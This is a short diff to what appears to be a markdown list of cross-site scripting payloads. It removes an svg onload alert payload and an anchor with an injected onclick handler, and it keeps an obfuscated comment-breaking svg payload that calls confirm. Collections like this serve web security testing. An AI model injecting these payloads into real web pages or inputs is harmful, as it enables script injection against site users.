@@ -1,14 +1,7 @@
 # XSS Payload
 ###
 ###
-```
-"><svg onload=alert()
-```
-###
-```
-<a href="https://evil.com/ \"onclick="alert(1)">```
-###
-```
+
 <!--><Svg OnLoad=(confirm)(1)-->
 ```
 ###
